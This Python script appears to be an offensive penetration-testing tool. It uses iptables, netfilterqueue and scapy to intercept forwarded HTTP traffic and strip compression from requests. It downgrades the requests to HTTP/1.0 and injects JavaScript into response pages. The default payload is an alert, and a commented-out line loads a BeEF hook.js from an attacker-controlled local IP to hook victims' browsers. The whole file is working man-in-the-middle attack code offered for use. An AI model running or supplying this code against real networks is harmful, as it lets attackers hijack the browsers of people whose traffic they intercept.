import netfilterqueue
import subprocess
import scapy.all as scapy
import re

Queue = None
QueueNum = 0

def init_iptables():
    # 1 is used for another macine, while 2 is for testing locally on Kali Linux
    # 1
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(QueueNum)])

    # 2
    #subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(QueueNum)])
    #subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(QueueNum)])

def flush_iptables():
    subprocess.call(['iptables','--flush'])

def arrange_new_pkt(pkt,load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].chksum
    del pkt[scapy.IP].len
    del pkt[scapy.TCP].chksum
    return bytes(pkt)


def process_pkt(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(scapy.TCP):
        load = scapy_pkt[scapy.Raw].load
        if scapy_pkt[scapy.TCP].dport == 80: # HTTP Request
            print('[+] HTTP Request detected!')
            load = re.sub(b'Accept-Encoding: .*?\\r\\n',b'',load)
            if b'HTTP/1.1' in load:
                load = re.sub(b'HTTP/1.1',b'HTTP/1.0',load)
            pkt.set_payload(arrange_new_pkt(scapy_pkt,load))
        elif scapy_pkt[scapy.TCP].sport == 80: # HTTP Response
            print('[+] HTTP Response detected!')
            script = b'<script>alert("HACKED!");</script>'
            # Below is for a script to be used in beef framework, change the ip address to use it on your own
            script_for_beef = b"<script src='http://192.168.2.125:3000/hook.js'></script>"
            #script = script_for_beef # 
            if b'</body>' in load:
                injection_code = b'</body>' + script
                load = re.sub(b'</body>',injection_code,load)
            if b'Content-Length: ' in load:
                regex_res = re.search(b'(Content-Length: )(\d*)(\\r\\n)',load)
                #print(regex_res.group(0)) # entire pattern
                #print(regex_res.group(1)) # 1st paranthesis group
                #print(regex_res.group(2)) # 2nd paranthesis group
                #print(regex_res.group(3)) # 3rd paranthesis group
                content_len = int(regex_res.group(2).decode()) +  len(script)
                replaced_str = b'Content-Length: ' + str(content_len).encode() + b'\r\n'
                load = re.sub(b'Content-Length: \d*\\r\\n',replaced_str,load)

            pkt.set_payload(arrange_new_pkt(scapy_pkt,load))
    pkt.accept()
def init_queue():
    global QueueNum, Queue
    Queue = netfilterqueue.NetfilterQueue()
    Queue.bind(QueueNum,process_pkt)
    Queue.run()

if __name__ == '__main__':
    init_iptables()
    try:
        init_queue()
    except KeyboardInterrupt:
        print('[-] Ctrl-C detected! Flushing the iptables...')
        flush_iptables()
